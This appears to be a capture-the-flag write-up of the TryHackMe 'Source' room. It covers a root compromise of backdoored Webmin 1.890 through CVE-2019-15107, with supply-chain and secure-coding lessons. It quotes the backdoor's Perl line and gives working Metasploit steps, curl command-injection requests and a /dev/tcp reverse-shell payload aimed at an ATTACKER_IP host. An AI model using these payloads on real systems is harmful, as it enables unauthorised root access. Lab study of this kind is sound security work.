---
title: "Source"
description: "A backdoored Webmin 1.890 release turns an unauthenticated POST to password_change.cgi into a root shell. The Source room is a compact lesson in supply-chain compromise, Perl command injection, and why the software you download matters as much as the software you run."
difficulty: "Easy"
tags: ["Webmin", "CVE-2019-15107", "Supply Chain", "Command Injection", "Metasploit", "Perl", "Linux", "Root Shell"]
date: "2026-07-21"
---

## Overview

Source is a short TryHackMe room with one central idea: a version number on a service banner can point to a compromise that happened years before the target was ever deployed. The machine exposes SSH and Webmin on port 10000. Webmin identifies itself as MiniServ 1.890, and that exact release is famous for a reason — the official SourceForge tarball shipped with a backdoor in `password_change.cgi`. A single unauthenticated HTTP POST makes Webmin run attacker-controlled text through Perl's `qx//` operator. Because Webmin runs as root, the result is a root shell with no login, no pivot, and no separate privilege escalation step.

The two flag names summarise the whole story. The user flag points at the *supply chain* failure that put the backdoor into a trusted download, and the root flag is a blunt instruction to *update your install*. This is a small room, but it teaches a large lesson: integrity matters as much as patch level, and a backdoor can be invisible in the version-controlled source while still being present in the artifact users actually install.

![Diagram of the Source attack path: a Webmin version scan leads to a backdoored CGI, a root shell, and both flags](/assets/screenshots/source/attack-chain.svg)

## Room Information

| Field | Value |
|-------|-------|
| Platform | TryHackMe |
| Room | Source |
| Difficulty | Easy |
| Category | boot2root / vulnerability research |
| Target | `10.48.165.200` at scan time (instance-specific) |
| Open ports | 22, 10000 |
| Service | Webmin 1.890 (MiniServ/1.890) over HTTPS |
| Operating system | Ubuntu Linux (OpenSSH 7.6p1 Ubuntu 4ubuntu0.3) |
| CVE | CVE-2019-15107 |
| Skills | Service fingerprinting, vulnerability research, supply-chain awareness, Perl `qx//` injection, Metasploit, root shell handling |
| User flag | `THM{SUPPLY_CHAIN_COMPROMISE}` |
| Root flag | `THM{UPDATE_YOUR_INSTALL}` |

TryHackMe reassigns the target IP whenever an instance is restarted, so the commands below use `TARGET` and `ATTACKER_IP` as placeholders. Substitute the address of your own instance.

The room folder contained four files: `nmap.txt`, `user.txt`, `root.txt`, and an empty `exploit` file. The nmap header records a scan started on 21 July 2026 at 14:38:31, and the two flag files were written at 15:05 the same day, which is why the post is dated 21 July 2026. There is no `.completed` marker. Because `exploit` is zero bytes, no local exploit code survived; the exploitation commands below were reconstructed from the official Webmin advisory, the Metasploit module source, and two independent published writeups, all credited in References.

The folder also contained no screenshots. The three terminal images in this post come from the DEFCON Webmin 1.920 analysis by AkkuS at pentest.com.tr; they illustrate the *sibling variant* of the same backdoor, not this exact room instance. The three diagrams are original to this post.

## Enumeration

### The Service Scan

The local notes contain a standard service-and-script scan against the target:

```bash
nmap -sV -sC -oN nmap.txt 10.48.165.200
```

```text
# Nmap 7.98 scan initiated Tue Jul 21 14:38:31 2026
Nmap scan report for 10.48.165.200
Host is up (0.043s latency).
Not shown: 998 closed tcp ports (reset)
PORT      STATE SERVICE  VERSION
22/tcp    open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  ssl/http MiniServ 1.890 (Webmin httpd)
|_http-server-header: MiniServ/1.890
| ssl-cert: Subject: commonName=*/organizationName=Webmin Webserver on source
| Not valid before: 2020-06-26T04:42:03
|_Not valid after:  2025-06-25T04:42:03
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Only two ports are open. SSH is the usual destination *after* credentials are found, so a two-port machine like this almost always wants the other service to produce them. Port 10000 is Webmin's default HTTPS management port, and nmap has done the most useful part of the work for us by resolving the banner to `MiniServ 1.890`.

A few details in the output are worth reading closely:

- `OpenSSH 7.6p1 Ubuntu 4ubuntu0.3` points to an Ubuntu 18.04-era build. Old components are a hint that known vulnerabilities may apply, but by themselves they are not an exploit.
- The certificate subject is `Webmin Webserver on source`, which matches the room name and confirms the service identity.
- The certificate validity window ends in June 2025. At the July 2026 scan time it is expired, so tools will need `-k` or an equivalent "ignore certificate errors" option. The `ssl-date` note is unrelated: Webmin's embedded TLS implementation does not randomise the timestamp the way modern stacks do.
- The empty HTTP title is normal for Webmin's root path, which redirects unauthenticated visitors toward the login CGI rather than serving a titled page.

Browsing to `https://TARGET:10000/` after accepting the certificate warning presents the Webmin login screen. There is no obvious form weakness and no credential in the folder, so brute force is not the intended route. The version is the hook.

### Why 1.890 Is Special

Webmin's own advisory lists releases 1.882 through 1.921 as affected by a remote command execution issue. Version 1.890 is singled out because it is exploitable in a **default install**; the later affected releases only become exploitable if an administrator enabled the "changing of expired passwords" feature. That distinction matters when researching the bug, because different writeups discuss different parameter names for what is fundamentally the same backdoor.

The timeline is now well documented:

![Timeline of the Webmin backdoor: the April 2018 build-server change, the 1.890 and 1.900-1.920 releases, and the August 2019 disclosure](/assets/screenshots/source/supply-chain-timeline.svg)

In April 2018, unknown attackers modified Webmin's development build server and added a line to `password_change.cgi`. They also backdated the file's timestamp so the change would not stand out in a routine listing. The altered script was packaged into the 1.890 tarball distributed through SourceForge, which the project's own download page linked to as an official source. A second modification in July 2018 introduced a similar backdoor into 1.900 through 1.920. The version-controlled source on GitHub was never backdoored — only the distributed tarballs were. That gap between "clean repository" and "poisoned artifact" is exactly what supply-chain attacks exploit.

In August 2019, a GitHub issue (#947) pointed out the suspicious line, CVE-2019-15107 was assigned, and Webmin published an advisory recommending an upgrade to 1.930. The NVD description for the CVE names the `old` parameter in `password_change.cgi`, while the Metasploit module documents both the 1.890 `expired` variant and the later `old` variant. Both descriptions are accurate for their respective versions.

### The Backdoor in the Code

The Metasploit module's documentation includes a diff between the vulnerable and fixed CGI files. The 1.890 version had this line at line 12:

```perl
$in{'expired'} eq '' || die $text{'password_expired'},qx/$in{'expired'}/;
```

The fixed 1.930 version replaced it with a simple feature check:

```perl
$miniserv{'passwd_mode'} == 2 || die "Password changing is not enabled!";
```

In Perl, `qx/.../` is the same as backticks: it hands the enclosed string to a shell and returns the command's output. Here, the value of the `expired` form field is interpolated directly into that shell command. The `die` call then includes the command output in the error page. So an attacker does not need to find a place where output is printed — the error handler prints it for them.

There is no authentication check before this line, no validation of the field, and no shell escaping. Webmin's main server process runs as root because it manages users, services, packages, and system configuration files. Anything `qx//` executes therefore inherits root privileges. That single line is the entire vulnerability.

![Flow of the Webmin backdoor: an expired form field becomes a Perl qx call that runs as root](/assets/screenshots/source/payload-flow.svg)

The later 1.900-1.920 variant moved the same idea to the `old` field, guarded by the expired-password feature check. The Metasploit module covers both by sending the command in `expired` and `old` in the same POST body. On this target, 1.890, the `expired` field is the one that fires.

## Initial Access

### Option A — Metasploit (the verified room path)

The published room walkthroughs use Metasploit's `webmin_backdoor` module, and it is the cleanest way to get a session. Older Metasploit installs place it at `exploit/unix/webapp/webmin_backdoor`; current installs moved it to `exploit/linux/http/webmin_backdoor`. Searching by name avoids guessing:

```bash
msfconsole -q
```

```text
msf6 > search webmin_backdoor

Matching Modules
================
   #  Name                                     Disclosure  Rank
   -  ----                                     ----------  ----
   0  exploit/linux/http/webmin_backdoor       2019-08-10  excellent
```

```text
msf6 > use 0
msf6 exploit(linux/http/webmin_backdoor) > show options
```

The required options are `RHOSTS`, `RPORT` (already 10000), and `SSL`, because Webmin serves the page over HTTPS. Set the listener address to your VPN interface:

```text
set RHOSTS TARGET
set RPORT 10000
set SSL true
set LHOST ATTACKER_IP
run
```

The module first performs a `GET /` and reads the `Server: MiniServ/x.yz` header. It then executes a benign `echo <random-token>` through the backdoor and checks whether the token appears in the response, so it verifies exploitability before sending a payload. The final request looks like this:

```http
POST /password_change.cgi HTTP/1.1
Host: TARGET:10000
Referer: https://TARGET:10000/
Content-Type: application/x-www-form-urlencoded

expired=<command>&new1=<token>&new2=<token>&old=<command>
```

The module's default target is "Automatic (Unix In-Memory)" with the payload `cmd/unix/reverse_perl`, so a successful run drops straight into an operating-system shell rather than a Meterpreter prompt. Confirm the privileged context and upgrade the shell to a fully interactive one:

```bash
whoami
# root

which python
python -c "import pty;pty.spawn('/bin/bash')"
```

The prompt becomes `root@source:/usr/share/webmin#`. From here both flags are plain file reads.

### Option B — Manual HTTP Request

Metasploit is convenient, but the exploit is only a POST request. The module's source shows exactly which fields it sends, so the same result can be reproduced with `curl`. The `-k` flag ignores the expired certificate:

```bash
curl -k "https://TARGET:10000/password_change.cgi" \
  -H 'Referer: https://TARGET:10000/' \
  --data-urlencode 'user=gotroot' \
  --data-urlencode 'expired=id' \
  --data-urlencode 'new1=test' \
  --data-urlencode 'new2=test'
```

The response is an error page containing the output of `id`:

```text
uid=0(root) gid=0(root) groups=0(root)
```

`--data-urlencode` is important for anything beyond a simple word: it percent-encodes the command so that characters such as `|`, `>`, and `&` are delivered as part of the form value rather than interpreted by `curl` or by the local shell. Webmin decodes the field before passing it to `qx//`.

A published proof-of-concept script uses a slightly different payload:

```bash
curl -k "https://TARGET:10000/password_change.cgi" \
  -H 'Referer: https://TARGET:10000/session_login.cgi' \
  -d 'user=gotroot&pam=&expired=2|echo "";id'
```

The `2|echo "";` prefix is not magic. It supplies a dummy `expired=2` value piped into a harmless `echo`, then appends the real command after a semicolon. Both forms reach the same backdoored `qx/$in{'expired'}/` call.

For a proper reverse shell, start a listener and inject a Bash `/dev/tcp` redirect:

```bash
nc -nlvp 4444
```

```bash
curl -k "https://TARGET:10000/password_change.cgi" \
  -H 'Referer: https://TARGET:10000/' \
  --data-urlencode 'user=gotroot' \
  --data-urlencode 'expired=bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' \
  --data-urlencode 'new1=test' \
  --data-urlencode 'new2=test'
```

The listener receives a root shell. If a direct callback is blocked, the same injection can fetch a script from the attacker's web server with `curl ... | bash`; the GitHub proof of concept in References demonstrates that approach with a file named `index.html`.

### What the Same Backdoor Looked Like in 1.920

The 1.900-1.920 variant uses `old` instead of `expired` and requires the expired-password feature. The screenshots below come from AkkuS's DEFCON analysis of that variant. They are included because the injected request and resulting shell are visually almost identical to what the 1.890 exploit produces, but they should not be mistaken for captures of this room.

The first image shows a proxied request to `password_change.cgi` with a command injected into the `old` field:

![A proxied Webmin password_change.cgi request with a command injected through the old field](/assets/screenshots/source/backdoor-request.png)

The proof of concept then replaces the command with a Netcat callback:

![A Netcat reverse-shell payload placed in the injected form field](/assets/screenshots/source/netcat-payload.png)

Finally, the article shows the shell that was received, with a `pwd` command running from Webmin's `acl` directory:

![Proof-of-concept shell after the related 1.920 exploit, running from Webmin's acl directory](/assets/screenshots/source/shell-proof.png)

## Privilege Escalation

There is no separate privilege escalation step in Source. The command injection exists inside a CGI script executed by Webmin's root-owned server process, so the shell returned by the exploit is already privileged:

```text
root@source:/usr/share/webmin# id
uid=0(root) gid=0(root) groups=0(root)
```

This is worth stating explicitly because many boot2root rooms assume a two-stage flow: get a low-privileged foothold, then find a kernel, SUID, or configuration weakness. Here the vulnerable component itself is the high-privilege component. Webmin needs root to perform its job, and the backdoor runs inside that trust boundary. The "privilege escalation" is the exploit itself.

If you land in a context that is not root on a different Webmin build, the usual checks still apply — `id`, `sudo -l`, SUID binaries, and the Webmin process owner in `ps aux` — but on this room they are unnecessary.

## Flags

Both flag files are readable from the root shell. The user flag sits in the home directory of the `dark` user, and the root flag is in `/root`:

```bash
ls -la /home/dark
cat /home/dark/user.txt
# THM{SUPPLY_CHAIN_COMPROMISE}

cat /root/root.txt
# THM{UPDATE_YOUR_INSTALL}
```

| Flag | Location | Value |
|------|----------|-------|
| User | `/home/dark/user.txt` | `THM{SUPPLY_CHAIN_COMPROMISE}` |
| Root | `/root/root.txt` | `THM{UPDATE_YOUR_INSTALL}` |

Both values were present in the local room folder and are confirmed by the independent walkthroughs cited below. The target IP is instance-specific, so it is not reproduced in the flag table.

## Commands Used

| Command | Purpose |
|---------|---------|
| `nmap -sV -sC -oN nmap.txt TARGET` | Fingerprint open ports and service versions; reveals MiniServ 1.890 |
| `msfconsole -q` | Start Metasploit without the banner |
| `search webmin_backdoor` | Locate the exploit module across Metasploit path changes |
| `use exploit/linux/http/webmin_backdoor` | Select the backdoor module (older name: `exploit/unix/webapp/webmin_backdoor`) |
| `set RHOSTS TARGET; set RPORT 10000; set SSL true; set LHOST ATTACKER_IP` | Point the module at Webmin over HTTPS and set the handler address |
| `run` | Verify the version, test the backdoor, and deliver a root shell |
| `python -c "import pty;pty.spawn('/bin/bash')"` | Turn the basic shell into an interactive one |
| `curl -k .../password_change.cgi --data-urlencode 'expired=id'` | Manually prove command execution without Metasploit |
| `nc -nlvp 4444` | Listen for the reverse shell |
| `cat /home/dark/user.txt`, `cat /root/root.txt` | Read the two flags |

## Lessons Learned

**Version banners are leads, not conclusions.** `MiniServ 1.890` did not prove a vulnerability by itself, but it gave a precise search term. The useful skill here is turning a banner into a version-specific question and then verifying the answer against an advisory or module source.

**Supply-chain trust is a real attack surface.** The Webmin source repository was clean, but the tarball linked from the official download page was not. An attacker who controls a build server or a distribution mirror can compromise everyone who installs the artifact, without touching a single application feature. The defensive lesson is to verify checksums and signatures out of band, prefer signed packages, and monitor for unexpected changes in release artifacts.

**Hidden changes need structural verification.** Backdating a file's modification time makes a casual `ls -l` review useless. Comparing the distributed file against a known-good copy — the diff3 in the Metasploit documentation is a perfect example — exposes exactly what changed.

**`qx//` and backticks are shell boundaries.** Interpolating untrusted input into either is equivalent to handing the user a shell. Input validation, allowlists, and avoiding the shell entirely are the correct defences; escaping is a distant third. The fact that this line sat in a password-changing CGI makes it no less dangerous.

**Understand the privilege of the component you exploit.** Webmin runs as root by design. A command injection in a root-owned daemon is a full compromise from the first request, so there is no need to hunt for a second bug. The same principle applies to any management agent, backup service, or monitoring tool with elevated rights.

**Read the exploit source, not just the usage line.** The Metasploit module documents the affected versions, the exact POST fields, the reason later releases need the expired-password feature, and the original diff. That is more educational than simply typing `run`, and it is what makes the manual `curl` reproduction possible.

**CVE descriptions can be narrower than the real story.** NVD emphasises the `old` parameter; the Metasploit module explains that 1.890 is exploitable in a default install through `expired`. When multiple writeups appear to disagree, check the affected version ranges instead of assuming one of them is wrong.

## References

- [TryHackMe — Source room](https://tryhackme.com/room/source)
- [Webmin security advisory — Webmin 1.882 to 1.921](http://www.webmin.com/exploit.html)
- [Webmin GitHub issue #947 — suspicious `password_change.cgi` line](https://github.com/webmin/webmin/issues/947)
- [NVD — CVE-2019-15107](https://nvd.nist.gov/vuln/detail/CVE-2019-15107)
- [Metasploit Framework — `webmin_backdoor` module source](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/linux/http/webmin_backdoor.rb)
- [Metasploit Framework — `webmin_backdoor` documentation](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/linux/http/webmin_backdoor.md)
- [AkkuS — DEFCON Webmin 1.920 Unauthenticated Remote Command Execution](https://pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html) — source of the three terminal screenshots
- [Jesus Gavancho — TryHackMe Source walkthrough](https://jesusgavancho.gitbook.io/writeups/source)
- [foxsin34 — Webmin 1.890 unauthenticated RCE proof of concept](https://github.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE)
- [MITRE ATT&CK — T1195 Supply Chain Compromise](https://attack.mitre.org/techniques/T1195/)
